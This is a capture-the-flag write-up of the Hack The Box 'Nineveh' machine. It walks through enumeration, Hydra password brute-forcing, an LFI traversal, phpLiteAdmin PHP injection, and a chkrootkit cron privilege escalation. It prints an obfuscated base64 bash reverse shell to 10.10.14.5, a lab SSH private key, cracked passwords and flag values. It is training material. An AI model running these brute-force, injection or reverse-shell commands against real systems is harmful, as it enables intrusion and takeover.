# Nineveh
>Author : Xyan1d3
>Date : 1st July 2021
>IP : 10.10.10.43
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Thu Jul  1 11:43:23 2021 as: nmap -sC -sV -v -oN nmap/nineveh 10.10.10.43
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up (0.077s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182 94b8 0210 7992 bf01 e802 b26f 8639
|_SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

## Gobuster on `http://10.10.10.43`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh]
└──╼ # gobuster dir -u http://10.10.10.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-http.out -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.43/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/01 11:50:07 Starting gobuster in directory enumeration mode
===============================================================
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299]
```

## Gobuster on `https://10.10.10.43`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh]
└──╼ # gobuster dir -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -t 50 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.43
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/01 11:51:28 Starting gobuster in directory enumeration mode
===============================================================
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
/server-status        (Status: 403) [Size: 300]                              
/secure_notes         (Status: 301) [Size: 319] [--> https://10.10.10.43/secure_notes/]
```

## Web Enumeration
We have a login page of the `http://10.10.10.43/department` which ask us for username and password.
![[Pasted image 20210701133742.png]]
It also has a weakness that it shows us whether the username is invalid or not, Something like the `wp-admin` in wordpress.

On sending the username : `admin` and the password : `admin`. We see that we get an `Invalid Password`.
![[Pasted image 20210701134231.png]]

But, On sending some junk username which does not exists. We get an `Invalid Username`.
![[Pasted image 20210701134413.png]]

This, Therefore proves that the `admin` is a valid username.
Now, We may try to bruteforce the credentials of the username admin using `hydra` and `rockyou.txt`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh]
└──╼ # hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!" -I
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-01 13:49:23
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=admin&password=^PASS^:Invalid Password!
[STATUS] 1546.00 tries/min, 1546 tries in 00:01h, 14342853 to do in 154:38h, 16 active
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-01 13:52:22
```

We find out the valid credentials of `http://10.10.10.43/department/login.php`.

|Username|Password|
|--|--|
|admin|1q2w3e4r5t|

The site has a page called notes.
![[Pasted image 20210701172103.png]]
We have some notes there but, the most important part is that the url is using a directory name and including it. Most Likely `LFI`able.
We visit this url and get an `LFI` : `http://10.10.10.43/department/manage.php?notes=/files/ninevehNotes.txt/../../../../../etc/passwd`
![[Pasted image 20210701174704.png]]

The SSL Certificate leaks a domain name which we can add to the `/etc/hosts`.
![[Pasted image 20210701131914.png]]

The `https://10.10.14.43/db` is hosting `PHPLiteadmin 1.9` which asks us for the password which we don't know. 
![[Pasted image 20210701161257.png]]
We will need the http POST parameters for bruteforcing with `hydra`.
![[Pasted image 20210701163249.png]]

So, We again start up `hydra` to bruteforce the credentials.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh]
└──╼ # hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -I
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-01 13:53:49
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.
[STATUS] 707.00 tries/min, 707 tries in 00:01h, 14343692 to do in 338:09h, 16 active
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-01 13:55:52
```

We find out that the phpliteadmin 1.9 is vulnaerable to a Authenticated php command injection.
![[Pasted image 20210701210747.png]]
The exploit is given underneath.
![[Pasted image 20210701210710.png]]

We login into the phpliteadmin and find out that it is a webserver to manage a sqlite database.
![[Pasted image 20210701210942.png]]


# Initial FootHold as www-data
According, To the exploit we have to create a database named something.php and then creating a table and a single field with a text in default value as php code we want to execute. Then, We would be able to visit the file and execute the php file.

![[Pasted image 20210701211444.png]]
![[Pasted image 20210701211633.png]]
![[Pasted image 20210701211930.png]]
Now, The file with reverse shell contents has been created successfully.
![[Pasted image 20210701212012.png]]

Therefore, We could use the LFI from the `http://10.10.10.43/department` to execute the php code and Hence, get a reverse shell back.

We visit the `http://10.10.10.43/department/manage.php?notes=/files/ninevehNotes/../../../../../var/tmp/magisk.php` and see that our browser hangs which is a very good sign that we have recieved a reverse shell.

And, We get a shell back as `www-data`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh]
└──╼ # shelter rev bash
Gtk-Message: 21:27:41.863: Failed to load module "colorreload-gtk-module"
Gtk-Message: 21:27:41.864: Failed to load module "window-decorations-gtk-module"
[+] Copied reverseshell payload echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Lzg4ODggMD4mMQ== |base64 -d|bash
[+] Starting up Shell Handler...
Listening on 0.0.0.0 8888
Connection received on 10.10.10.43 45146
bash: cannot set terminal process group (1409): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# User Escalation to amrois
This part of the box sucks as it is a stegnography.
![[Pasted image 20210701231006.png]]

We transfer the image to our box and run `binwalk -e` to find out that it has a directory which has a ssh private key inside.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh/images]
└──╼ # binwalk -e nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)

┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh/images]
└──╼ # cd _nineveh.png.extracted/
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh/images/_nineveh.png.extracted]
└──╼ # ls -l
total 2844
-rw-r--r-- 1 root     root       10240 Jul  1 23:16 2BF8D0.tar
-rw-r--r-- 1 root     root           0 Jul  1 23:16 54
-rw-r--r-- 1 root     root     2891900 Jul  1 23:16 54.zlib
drwxr-xr-x 2 www-data www-data    4096 Jul  2  2017 secret
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh/images/_nineveh.png.extracted]
└──╼ # cd secret/
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh/images/_nineveh.png.extracted/secret]
└──╼ # ls
nineveh.priv  nineveh.pub
```

The SSH Private key
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```

## Getting the user.txt
```python
amrois@nineveh:~$ ls -l
total 4
-rw------- 1 amrois amrois 33 Jul  1 13:34 user.txt
amrois@nineveh:~$ cat user.txt 
8da0af764c2d29b5147504225f4ce2d2
```

# Root Escalation
The Root Escalation requires a little bit of enumaration which will allow us to find out that the box is running `chkrootkit` which is vulnerable to `CVE-2014-0476` and will allow us to get `root` on the box.
Source : https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/

For, Exploiting this we simply need to create a file named `update` in the `/tmp` directory with malicious commands to execute. Now, As the cron is executing the `chkrootkit` command every 1 minute the box on executing the chkrootkit command will execute the `/tmp/update` and give us a reverse shell.
```python
amrois@nineveh:/tmp$ ls -l update 
-rwxrwxr-x 1 amrois amrois 78 Jul  1 15:09 update
amrois@nineveh:/tmp$ cat update 
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Lzg4ODggMD4mMQ== |base64 -d|bash
```
We get the root shell after a minute.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/nineveh]
└──╼ # shelter rev bash
Gtk-Message: 01:40:19.338: Failed to load module "colorreload-gtk-module"
Gtk-Message: 01:40:19.339: Failed to load module "window-decorations-gtk-module"
[+] Copied reverseshell payload echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Lzg4ODggMD4mMQ== |base64 -d|bash
[+] Starting up Shell Handler...
Listening on 0.0.0.0 8888
Connection received on 10.10.10.43 49636
bash: cannot set terminal process group (30723): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Getting the root flag
```python
root@nineveh:~# ls -l
total 12
-rw------- 1 root root  33 Jul  1 13:34 root.txt
-rw-r--r-- 1 root root  37 Dec 17  2020 test.txt
-rwx------ 1 root root 139 Jul  2  2017 vulnScan.sh
root@nineveh:~# cat root.txt 
ac1f0f740957faa143d2de15558c6827
```
# Credentials
|Credentials Location|Username|Password|Found From|
|--|--|--|--|
|`http://10.10.10.43/department/login.php`|admin|1q2w3e4r5t|Hydra bruteforce on the site|
|`https://10.10.10.43/db/index.php`|`No_Username`|password123|Hydra bruteforce on the phpliteadmin page|
